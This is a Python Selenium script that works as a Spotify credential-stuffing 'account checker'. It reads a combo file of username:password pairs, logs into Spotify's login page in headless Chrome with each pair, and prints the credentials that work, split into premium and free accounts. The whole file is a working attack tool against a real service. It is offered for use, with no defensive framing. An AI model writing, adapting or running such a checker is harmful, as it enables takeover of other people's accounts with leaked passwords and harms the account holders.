from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import sys


def login(username, pwd):
    time.sleep(3)
    driver.get(
        "https://accounts.spotify.com/en/login?continue=https://www.spotify.com/us/account/overview/")
    driver.find_element(By.XPATH, '//*[@id="login-username"]').clear()
    driver.find_element(
        By.XPATH, '//*[@id="login-username"]').send_keys(username)
    driver.find_element(By.XPATH, '//*[@id="login-password"]').clear()
    driver.find_element(By.XPATH, '//*[@id="login-password"]').send_keys(pwd)
    driver.find_element(By.XPATH, '//*[@id="login-button"]').click()
    time.sleep(4)
    if driver.find_element(By.XPATH, '//*[@id="your-plan"]/section/div/div[2]/div/div[2]/div/h3').text != "Free":
        print(f"Permium Account: {username} {pwd}")
    elif driver.find_element(By.XPATH, '//*[@id="your-plan"]/section/div/div[2]/div/div[2]/div/h3').text == "Free":
        print(f"Free Account: {username} {pwd}")
    driver.get("https://www.spotify.com/us/logout/")


# chromedriver = "chromedriver.exe"  # should be in same path
sys.path.insert(0, '/usr/lib/chromium-browser/chromedriver')
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--no-log')
chrome_options.add_argument('--log-level=3')
chrome_options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome('chromedriver', options=chrome_options)

# Getting combo path
path = input("Your combo file full address: ")

# Main Code
with open(path, "r") as filehandle:
    for combo in filehandle:
        combo = combo.strip()
        username = ''
        pwd = ''
        chrachter = 0
        try:
            for i in range(len(combo)):
                while combo[int(chrachter)] != ':':
                    username += combo[chrachter]
                    chrachter += 1
            pwd = combo[chrachter+1:]
            login(username, pwd)
        except:
            pass
